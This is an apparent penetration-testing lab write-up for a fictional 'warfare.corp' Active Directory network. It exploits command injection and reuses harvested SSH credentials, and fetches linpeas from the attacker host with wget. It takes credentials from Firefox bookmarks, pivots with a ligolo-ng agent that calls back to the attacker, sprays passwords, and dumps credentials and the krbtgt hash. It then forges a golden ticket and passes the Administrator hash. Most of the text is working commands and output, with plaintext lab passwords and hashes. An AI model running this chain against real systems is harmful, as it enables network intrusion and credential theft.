# Temp1

## General Info





## Network Discovery

```bash
nmap -sn 192.168.80.0/24

Nmap scan report for 192.168.80.10
```

## Port Scanning

```bash
nmap -T4 -sV -p- --open -oN port_scan.txt 192.168.80.10

Nmap scan report for 192.168.80.10
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Web Enumration

In the email newsletter there is a Command Injection. We can read the /etc/passwd and obtain a clear-credential.

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
privilege:x:1001:1001:Admin@962:/home/privilege:/bin/bash
```

## SSH Access

with the credentials obtained, let's try to access through SSH.

```bash
ssh privilege@192.168.80.10
> Admin@962
```

### Linux Enum with linpeas

```bash
# Attacker machine
peass
cd linpeas
python3 -m http.server 80

# target machine
wget http://10.10.200.56/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

We discovered:

* New network to pivoting

```bash
ens34: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.98.15  netmask 255.255.255.0  broadcast 192.168.98.255
        ether 00:50:56:96:e4:32  txqueuelen 1000  (Ethernet)
        RX packets 727  bytes 122997 (122.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1211  bytes 267261 (267.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 16  base 0x1000  
```

* Mozilla juicy DB

```
/home/privilege/.mozilla/firefox/b2rri1qd.default-release/places.sqlite
/home/privilege/.mozilla/firefox/b2rri1qd.default-release/credentialstate.sqlite
/home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage.sqlite

```

* Password in PHP config

```
/var/www/html/config.php:        $password = 'Web!@#$%';
```



### Creds in Firefox Bookmarks

Print the Table `moz_bookmarks` of the `places.sqlite` db and we obtain a AD credential

{% code overflow="wrap" %}
```bash
sqlite3 places.sqlite
SELECT * FROM moz_bookmarks;

# query output
18|1|16|5|0|http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6|||1737028407427000|1737029666390000|tuXr2pTr03P2|1|7

```
{% endcode %}

Credential obteined:

```
john@child.warfare.corp:User1@#$%6
```



## Pivoting

With the other Network found make a pivot connection

{% code overflow="wrap" %}
```bash
#Attacker Machine, download proxy & agent :
#Proxy
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz

tar -xvzf ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz

#Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz

python3 -m http.server 8080

wget http://10.10.200.56:80/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
tar -xvzf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
```
{% endcode %}

Set up the attacker machine

<pre class="language-bash"><code class="lang-bash"><strong>sudo ip tuntap add user kali mode tun ligolo
</strong>
#Delete the 192.168.98.0/24 IP Range from the tun0 interface :
sudo ip route del 192.168.98.0/24 dev tun0

#Up the ligolo interface :
sudo ip link set ligolo up

#Add 192.168.98.0/24 IP range to the ligolo interface :
sudo ip route add 192.168.98.0/24 dev ligolo
</code></pre>

```bash
# start the proxy on attacker machine
./proxy -selfcert -laddr 0.0.0.0:443

# start the agent on the target machine
./agent -connect 10.10.200.56:443 -ignore-cert
```

On the ligolo-ng proxy, check the session & start the tunnel.

```
session
start
```

Try to ping the device discovered into Mozilla Firefox

```bash
ping 192.168.98.30

PING 192.168.98.30 (192.168.98.30) 56(84) bytes of data.
64 bytes from 192.168.98.30: icmp_seq=1 ttl=64 time=100 ms
64 bytes from 192.168.98.30: icmp_seq=2 ttl=64 time=102 ms
```

## Network Discovery (Network 2)

Using SSH connection as Privilege user to Linux machine we can run the arp command to discover other device in the another networks

```
privilege@ubuntu-virtual-machine:~$ arp -a

? (192.168.80.1) at 00:50:56:96:c4:bf [ether] on ens32
? (192.168.98.2) at 00:50:56:96:1e:98 [ether] on ens34
? (192.168.98.30) at 00:50:56:96:f8:38 [ether] on ens34
? (192.168.98.1) at 00:50:56:96:0e:7d [ether] on ens34
? (192.168.98.120) at 00:50:56:96:70:ab [ether] on ens34
```

Now create a file with all host discovered (including the start machine)

{% code title="targets.txt" %}
```
192.168.98.2
192.168.98.15
192.168.98.30
192.168.98.120
```
{% endcode %}

### Password Spray

Now try to do a Password Spray with AD credentials discovered before.

```bash
crackmapexec smb targets.txt -u john -p 'User1@#$%6'

SMB 192.168.98.2    445    DC01        [-] warfare.corp\john:User1@#$%6 STATUS_LOGON_FAILURE 
SMB 192.168.98.120  445    CDC         [+] child.warfare.corp\john:User1@#$%6 
SMB 192.168.98.30   445    MGMT        [+] child.warfare.corp\john:User1@#$%6 (Pwn3d!)
```

As we can see, with this credentials we have pwned the MGMT machine (192.168.98.30).

### Credentials Dump

Try to ecxtract some other credentials

```bash
impacket-secretsdump 'john@192.168.98.30'
> User1@#$%6

# output 
[..snip..]
corpmngr@child.warfare.corp:User4&*&*
[..snip..]
```

With this new credentils found we can redo the password spray

```bash
crackmapexec smb targets.txt -u corpmngr -p 'User4&*&*'

#output 
SMB 192.168.98.2    445    DC01 [-] warfare.corp\corpmngr:User4&*&* STATUS_LOGON_FAILURE 
SMB 192.168.98.120  445    CDC  [+] child.warfare.corp\corpmngr:User4&*&* (Pwn3d!)
SMB 192.168.98.30   445    MGMT [+] child.warfare.corp\corpmngr:User4&*&*
```

Now, with this credentials we have the full access to Child Domain Controller (192.168.98.120).

## Get control of DC

Having pwned the CDC, we can try to extract the krbtgt hash, and craft a golden ticket to access in the main DC.

```bash
impacket-secretsdump 'corpmngr@192.168.98.120'
> User4&*&*

# output 
[..snip..]
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
[..snip..]
```

Now we have to get all SID required to forge the ticket

```bash
impacket-lookupsid child/corpmngr:'User4&*&*'@warfare.corp

#output 
[*] Domain SID is: S-1-5-21-3375883379-808943238-3239386119
519: WARFARE\Enterprise Admins (SidTypeGroup)
```

```bash
impacket-lookupsid child/corpmngr:'User4&*&*'@child.warfare.corp

# output
[*] Domain SID is: S-1-5-21-3754860944-83624914-1883974761
1106: CHILD\corpmngr (SidTypeUser)
```

### Craft Gold Ticket

{% code overflow="wrap" %}
```bash
impacket-ticketer -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 519 -user-id 1106 -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 'corpmngr'
```
{% endcode %}

### Use the Golden Ticket

Now that we have a TGT ticket, we can craft an ST for access to the PARENT DC.

{% code overflow="wrap" %}
```bash
export KRB5CCNAME=corpmngr.ccache

impacket-getST -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug
```
{% endcode %}

Once we have created the ST, dump credentials with impacket or access through the SMB into machine.

```bash
export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache

impacket-secretsdump -no-pass -k dc01.warfare.corp -just-dc-user 'warfare\Administrator' -debug

#output 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60:::
```



### Access as Administrator

Pass-the-Hash in Evil-Winrm&#x20;

```bash
evil-winrm -i 192.168.98.2 -u 'warfare\Administrator' -H 'a2f7b77b62cd97161e18be2ffcfdfd60'
```
